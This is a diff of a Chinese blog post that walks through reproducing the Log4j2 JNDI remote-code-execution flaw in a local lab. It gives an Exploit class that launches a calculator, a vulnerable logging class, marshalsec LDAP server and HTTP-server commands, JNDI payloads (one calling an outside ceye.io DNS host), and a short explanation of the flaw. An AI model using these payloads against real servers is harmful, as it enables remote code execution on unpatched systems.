@@ -19,7 +19,7 @@
     <meta name="keywords" content="tea9,tea9的博客,开发,android,安全,android安全,android逆向,移动安全,frida,xposed,ollvm,查查查,茶茶茶,茶茶,茶姐姐,茶姐姐博客,茶茶茶博客,茶茶blog">
 
 
-<title>log4j2安全远程漏洞 | tea9のblog</title>
+<title>log4j2安全远程漏洞复现 | tea9のblog</title>
 
 
 
@@ -202,7 +202,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">log4j2安全远程漏洞</h1>
+            <h1 class="post-title">log4j2安全远程漏洞复现</h1>
             
                 <div class="post-meta">
                     
@@ -280,36 +280,78 @@
 
 
 
-<h2 id="Log4j2-复现"><a href="#Log4j2-复现" class="headerlink" title="Log4j2 复现"></a>Log4j2 复现</h2><p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1719588505580618757&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1719588505580618757&amp;wfr=spider&amp;for=pc</a></p>
-<p>写一个攻击类</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package log4j;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line"></span><br><span class="line">        String commands=&quot;calc.exe&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Log4j2-复现"><a href="#Log4j2-复现" class="headerlink" title="Log4j2 复现"></a>Log4j2 复现</h2><p><a target="_blank" rel="noopener" href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce">https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce</a></p>
+<p>说明：之前一直复现不成功然后翻文章找到大佬写的项目然后用项目就复现成功了，记录下</p>
+<p><strong>影响版本：</strong>Apache Log4j 2.x&lt;&#x3D;2.15.0.rc1</p>
+<p>jdk1.8.191以上默认不支持ldap协议,建议下个低版本的jdk</p>
+<p>java版本：1.8.0_121</p>
+<p>下载链接选择Java SE Development Kit 8u121 </p>
+<p>（重新下载安装新的jdk需要重新设置环境变量</p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
+<p>更多java历史版本：</p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/downloads/archive/">https://www.oracle.com/java/technologies/downloads/archive/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\tea90&gt; java -version</span><br><span class="line">java version &quot;1.8.0_121&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_121-b13)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.121-b13, mixed mode)</span><br></pre></td></tr></table></figure>
 
-<p>编译 (或者直接去IDEA编译目录  文件-项目结构-模块-路径-输出目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>
+<p>maven版本：3.8.5</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\tea90&gt; mvn -version</span><br><span class="line">Apache Maven 3.8.5 (3599d3414f046de2324203b78ddcf9b5e4388aa0)</span><br><span class="line">Maven home: C:\Users\tea90\Documents\tea\tools\apache-maven-3.8.5-bin\apache-maven-3.8.5</span><br><span class="line">Java version: 1.8.0_121, vendor: Oracle Corporation, runtime: C:\Program Files\Java\jdk1.8.0_121\jre</span><br><span class="line">Default locale: zh_CN, platform encoding: GBK</span><br><span class="line">OS name: &quot;windows 10&quot;, version: &quot;10.0&quot;, arch: &quot;amd64&quot;, family: &quot;windows&quot;</span><br></pre></td></tr></table></figure>
 
-<p>起一个服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\tea90\IdeaProjects\MavenTest\target\classes\log4j</span><br><span class="line">λ python3 -m http.server 8100</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8100 (http://0.0.0.0:8100/) ...</span><br><span class="line">127.0.0.1 - - [01/Mar/2023 18:02:59] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">127.0.0.1 - - [01/Mar/2023 18:02:59] code 404, message File not found</span><br><span class="line">127.0.0.1 - - [01/Mar/2023 18:02:59] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://localhost:8888/Exploit&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以上攻击类搞好了！</p>
 <hr>
-<p>Log4j受害服务搞一下</p>
-<p>pom.xml 添加log4j依赖</p>
+<p>log4j版本</p>
+<p>pom.xml</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
 
-<p>在重新执行下pom文件</p>
-<p>需要jdk1.8</p>
+<p>攻击类（就是弹个计算器然后兼容了各个系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit() &#123;&#125;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)</span><br><span class="line">                    ? new String[]&#123;&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;calc.exe&quot;&#125;</span><br><span class="line">                    : new String[]&#123;&quot;open&quot;,&quot;/System/Applications/Calculator.app&quot;&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmds).waitFor();</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Exploit e = new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>受害类（执行exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class log4j &#123;</span><br><span class="line">    private static final Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //The default trusturlcodebase of the higher version JDK is false</span><br><span class="line">        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);</span><br><span class="line">        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploit&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编译exp类(会生成Exploit.class</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac .\Exploit.java</span><br></pre></td></tr></table></figure>
+
+<p>启动一个服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...</span><br></pre></td></tr></table></figure>
+
+<p>测试启动服务（需要新开一个命令行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -I 127.0.0.1:8888/Exploit.class</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Server: SimpleHTTP/0.6 Python/3.6.3</span><br><span class="line">Date: Thu, 02 Mar 2023 03:53:17 GMT</span><br><span class="line">Content-type: application/octet-stream</span><br><span class="line">Content-Length: 1035</span><br><span class="line">Last-Modified: Thu, 02 Mar 2023 03:50:39 GMT</span><br></pre></td></tr></table></figure>
+
+<p>需要一个工具运行<em>LDAP 服务器实现返回 JNDI 引用</em></p>
+<p>工具源地址（需要编译因为我不会编译就直接找的jar包，应该是之前大佬发的，使用工具可以自行编译下 mvn clean package</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p>
+<p>生成marshalsec-0.0.3-SNAPSHOT-all.jar然后执行 返回JNDI引用(然后不太清楚1389的端口是哪里来的就直接用就好了，见受害类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8888/#Exploit&quot;</span><br><span class="line">Listening on 0.0.0.0:1389</span><br></pre></td></tr></table></figure>
+
+<p>然后激动人心的时刻了，运行受害类</p>
+<p>先打包(会在项目跟目录target文件夹生成log4j-rce-1.0-SNAPSHOT-all.jar包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\tea90\Downloads\CVE-2021-44228-Apache-Log4j-Rce-main&gt; mvn clean package</span><br></pre></td></tr></table></figure>
+
+<p>然后执行jar包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> java -cp target/log4j-rce-1.0-SNAPSHOT-all.jar log4j</span><br><span class="line">11:41:35.712 [main] ERROR log4j - $&#123;jndi:ldap://127.0.0.1:1389/Exploit&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器</p>
+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/53/1.jpg"></p>
 <p>dns payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://12345.p7yc0x.ceye.io:1389/aaa&#125;</span><br></pre></td></tr></table></figure>
 
+<p>maven打包打完整类</p>
+<p>pom.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;build&gt;</span><br><span class="line">       &lt;plugins&gt;</span><br><span class="line">           &lt;plugin&gt;</span><br><span class="line">               &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">               &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span><br><span class="line">               &lt;version&gt;2.19.1&lt;/version&gt;</span><br><span class="line">           &lt;/plugin&gt;</span><br><span class="line">           &lt;plugin&gt;</span><br><span class="line">               &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;</span><br><span class="line">               &lt;configuration&gt;</span><br><span class="line">                   &lt;finalName&gt;$&#123;project.artifactId&#125;-$&#123;project.version&#125;-all&lt;/finalName&gt;</span><br><span class="line">                   &lt;appendAssemblyId&gt;false&lt;/appendAssemblyId&gt;</span><br><span class="line">                   &lt;descriptorRefs&gt;</span><br><span class="line">                       &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;</span><br><span class="line">                   &lt;/descriptorRefs&gt;</span><br><span class="line">               &lt;/configuration&gt;</span><br><span class="line">               &lt;executions&gt;</span><br><span class="line">                   &lt;execution&gt;</span><br><span class="line">                       &lt;id&gt;make-assembly&lt;/id&gt;</span><br><span class="line">                       &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">                       &lt;goals&gt;</span><br><span class="line">                           &lt;goal&gt;single&lt;/goal&gt;</span><br><span class="line">                       &lt;/goals&gt;</span><br><span class="line">                   &lt;/execution&gt;</span><br><span class="line">               &lt;/executions&gt;</span><br><span class="line">           &lt;/plugin&gt;</span><br><span class="line">       &lt;/plugins&gt;</span><br><span class="line">   &lt;/build&gt;</span><br></pre></td></tr></table></figure>
 
 
 
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在我浅薄的看来，log4支持lookup，日志中包含${}lookup功能就会将表达式的内容替换为表达式解析的内容，而不是表达式本身，然后他解析他就会执行啊，那你传命令他也就会执行，然后就可以利用这点传输一些反弹shell啥的就可以控制服务器了。</p>
+<p>常见的解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$&#123;ctx:loginId&#125;</span><br><span class="line">$&#123;map:type&#125;</span><br><span class="line">$&#123;filename&#125;</span><br><span class="line">$&#123;date:MM-dd-yyyy&#125;</span><br><span class="line">$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;</span><br><span class="line">$&#123;docker:imageName&#125;</span><br><span class="line">$&#123;env:USER&#125;</span><br><span class="line">$&#123;event:Marker&#125;</span><br><span class="line">$&#123;mdc:UserId&#125;</span><br><span class="line">$&#123;java&#125;</span><br><span class="line">$&#123;jndi:logging/context-name&#125;</span><br><span class="line">$&#123;hostName&#125;</span><br><span class="line">$&#123;docker:containerId&#125;</span><br><span class="line">$&#123;k8s&#125;</span><br><span class="line">$&#123;log4j&#125;</span><br><span class="line">$&#123;main&#125;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">$&#123;marker&#125;</span><br><span class="line">$&#123;spring&#125;</span><br><span class="line">$&#123;sys:logPath&#125;</span><br><span class="line">$&#123;web:rootDir&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后jndi是一个目录系统接口，简单来说就是可以直接访问文件，然后利用jndi这个解析可以把一些恶意代码类传输给打印日志的方法进行执行。</p>
+<p>${jndi:ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Exploit}</p>
+<p>${}是告诉log4j要用lookup解析执行</p>
+<p>jndi:ldap是传输一个类让他执行</p>
+<p>为什么说log4j这个漏洞影响大是因为很多中间件（Spring-Boot-strater-log4j2\Apache Struts2\Apache Solr\Apache Flink\Apache Druid\ElasticSearch\Flume\DubboRedis\Logstash\Kafka包括不限于）打印日志都是用的这个，其次就是利用方式很简单，也没有过多苛刻的条件。</p>
 <h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/LifR0gbTcERU4Uvicc4LOw">https://mp.weixin.qq.com/s/LifR0gbTcERU4Uvicc4LOw</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/53596025">https://zhuanlan.zhihu.com/p/53596025</a></p>
 <p><a target="_blank" rel="noopener" href="https://xy2401.com/local-docs/oracle/java.zh/tutorial/rmi/running.html">https://xy2401.com/local-docs/oracle/java.zh/tutorial/rmi/running.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hlMbRl5EEtBe0-d3xvwyXg">https://mp.weixin.qq.com/s/hlMbRl5EEtBe0-d3xvwyXg</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ">https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ</a></p>
 
         </div>
 
